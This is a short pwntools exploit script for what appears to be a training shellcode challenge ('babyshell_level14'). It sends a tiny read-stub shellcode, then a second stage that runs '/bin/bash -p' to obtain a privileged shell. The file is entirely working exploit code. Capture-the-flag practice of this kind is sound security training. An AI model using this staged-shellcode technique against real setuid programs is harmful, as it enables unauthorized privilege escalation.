from pwn import *

DEBUG = len(sys.argv) > 1 and sys.argv[1] == 'debug'

bin_path = '/challenge/babyshell_level14'
context.arch = 'amd64'

if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    p = gdb.debug([bin_path])
else:
    p = process([bin_path], cwd='/home/hacker')

print(p.recvuntil(b'[LEAK]').decode())

shellcode = f'''
push rdx
pop rsi

push rax
pop rdi

syscall
'''

shellcode = asm(shellcode)

print(disasm(shellcode))
p.send(shellcode)

time.sleep(1)
sc = shellcraft.amd64
p.send(asm(sc.nop() * 6 + sc.linux.execve('/bin/bash', ['bash', '-p'])))

p.interactive()